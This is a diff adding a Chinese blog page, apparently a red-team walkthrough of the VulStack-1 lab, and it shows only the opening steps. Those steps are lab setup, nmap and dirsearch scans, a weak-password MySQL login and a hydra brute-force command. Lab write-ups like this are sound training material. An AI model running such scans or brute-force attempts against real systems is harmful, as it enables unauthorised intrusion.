@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>红队实战之VulStack-1 - T0x1c</title>
+
+  
+    <meta name="description" content="红日靶机系列是完全模拟ATT&amp;CK攻击链路来搭建的，通过练习真实的APT实战环境我们可以从中快速成长。VulStack1 是该系列的第一个靶场，主要涉及信息收集、漏洞利用、CS上线、搭建隧道以及域内渗透等知识。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队实战之VulStack-1">
+<meta property="og:url" content="https://toxic80l.github.io/post/50c969ee/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="红日靶机系列是完全模拟ATT&amp;CK攻击链路来搭建的，通过练习真实的APT实战环境我们可以从中快速成长。VulStack1 是该系列的第一个靶场，主要涉及信息收集、漏洞利用、CS上线、搭建隧道以及域内渗透等知识。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.02.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.15.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.07.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.22.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%886.15.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.30.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.42.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.41.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.44.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.46.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.09.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.11.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.21.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.25.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.26.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.36.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.38.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.39.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.44.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.46.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.47.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.53.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.55.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.59.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.03.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.07.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.09.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.17.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.26.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.28.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.29.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.45.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.45.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.47.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.55.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.55.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.03.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.04.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.06.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.02.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8B%E5%8D%883.07.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.34.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.36.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.38.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8B%E5%8D%885.04.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.12.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.13.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.28.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.25.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.49.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.53.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.59.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.00.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.06.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.09.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.13.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.21.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.21.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2019.41.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2019.42.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.19.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.29.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.35.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.14.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.18.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.22.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.23.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.32.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.51.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.58.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.56.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.00.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.08.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.05.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.09.14.png">
+<meta property="article:published_time" content="2022-05-22T14:39:23.000Z">
+<meta property="article:modified_time" content="2022-05-24T14:21:38.248Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="YxCMS">
+<meta property="article:tag" content="PTH">
+<meta property="article:tag" content="FRP">
+<meta property="article:tag" content="CS">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.02.11.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x01 靶机环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4"><span class="toc-text">0x02 外网边界突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3306%E7%AB%AF%E5%8F%A3"><span class="toc-text">3306端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="toc-text">MySQL日志写入木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YXCMS%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="toc-text">YXCMS后台上传木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-text">0x03 内网信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E4%B8%8A%E7%BA%BFVPS%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">CS上线VPS服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">本机基础环境信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">内网域环境信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">0x04 内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8BFRP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-text">建立FRP代理隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E9%85%8D%E7%BD%AE"><span class="toc-text">FRP配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FRP%E8%BF%9E%E6%8E%A5"><span class="toc-text">FRP连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">MSF永恒之蓝漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FSCAN%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">FSCAN漏洞扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">域控主机上线CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">域内主机上线CS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%87%AD%E8%AF%81%E4%BC%A0%E9%80%92%E5%88%A9%E7%94%A8"><span class="toc-text">域管理员凭证传递利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BC%A0%E9%80%92%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">凭证传递利用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BC%A0%E9%80%92%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">凭证传递上线CS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="toc-text">0x05 靶场学习总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-05-22T14:39:23.000Z">2022-05-22</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>红队实战之VulStack-1</span></h1>
+<p>红日靶机系列是完全模拟ATT&amp;CK攻击链路来搭建的，通过练习真实的APT实战环境我们可以从中快速成长。VulStack1 是该系列的第一个靶场，主要涉及信息收集、漏洞利用、CS上线、搭建隧道以及域内渗透等知识。<span id="more"></span></p>
+<h2 id="0x01-靶机环境搭建"><a href="#0x01-靶机环境搭建" class="headerlink" title="0x01 靶机环境搭建"></a>0x01 靶机环境搭建</h2><p>靶场中包含三台靶机，具体的网络拓扑图如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.02.11.png" alt="截屏2022-05-22 03.02.11"></p>
+<p>从上图可知我们需要模拟内网和外网两个网段，因此我们需要在 VMware 中选择虚拟网络编辑器设置内网网段<code>192.168.52.0/24</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.15.28.png" alt="截屏2022-05-22 上午3.15.28"></p>
+<p>完成后为三台靶机在主机网卡中添加<code>VMnet2</code>，与此同时还需要为 Web 服务器添加桥接网卡作为外网网段。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.07.51.png" alt="截屏2022-05-22 上午3.07.51"></p>
+<p>三台靶机的默认开机密码都为<code>hongrisec@2019</code>，登录后提示需要修改密码信息，因此根据需要我们将其修改为<code>Mac123456</code>，最终我们的靶机IP分布如下。</p>
+<table>
+<thead>
+<tr>
+<th>靶机名称</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web服务器</td>
+<td>192.168.0.112/192.168.52.143</td>
+</tr>
+<tr>
+<td>域内主机</td>
+<td>192.168.52.141</td>
+</tr>
+<tr>
+<td>域控主机</td>
+<td>192.168.52.138</td>
+</tr>
+</tbody></table>
+<p>尝试 ping 通各个主机后找到 phpstudy 开启 Web 服务模拟 Web 服务<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%883.22.17.png" alt="截屏2022-05-22 上午3.22.17"></p>
+<p>同时我们需要保持外网、域网络防火墙为未开启状态<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8A%E5%8D%886.15.39.png" alt="截屏2022-05-22 上午6.15.39"></p>
+<p>正常访问站点，说明环境成功搭建完成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.30.53.png" alt="截屏2022-05-22 03.30.53"></p>
+<h2 id="0x02-外网边界突破"><a href="#0x02-外网边界突破" class="headerlink" title="0x02 外网边界突破"></a>0x02 外网边界突破</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用 Nmap 扫描 web 服务器的端口开放情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -p- -A 192.168.0.112 --min-rate=1000</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.42.54.png" alt="截屏2022-05-22 03.42.54"></p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问后为 phpStudy 探针，在页面中使用弱口令 root/root 能够成功登录 MySQL 数据库<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.41.26.png" alt="截屏2022-05-22 03.41.26"></p>
+<p>使用 dirsearch 对站点进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.0.112 -e *</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.44.21.png" alt="截屏2022-05-22 03.44.21"></p>
+<p>成功发现目录<code>phpmyadmin</code>并访问，页面为数据库管理工具 PHPMyAdmin<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2003.46.13.png" alt="截屏2022-05-22 03.46.13"></p>
+<p>使用 dirsearch 继续扫描备份文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.0.112 -w /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/directoryDicts/top7000.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.09.07.png" alt="截屏2022-05-22 04.09.07"></p>
+<p>成功发现备份文件<code>beifen.rar</code>，解压后发现这是 xycms 的备份源码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.11.17.png" alt="截屏2022-05-22 04.11.17"></p>
+<h4 id="3306端口"><a href="#3306端口" class="headerlink" title="3306端口"></a>3306端口</h4><p>尝试使用 hydra 爆破 MySQL 数据库密码，但是目标不允许连接数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/passwordDict/ServiceWeakPass/mysql弱口令/mysql-user.txt -P /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/passwordDict/ServiceWeakPass/mysql弱口令/mysql-pass.txt mysql://192.168.0.112 -e nsr -vV</span><br></pre></td></tr></table></figure>
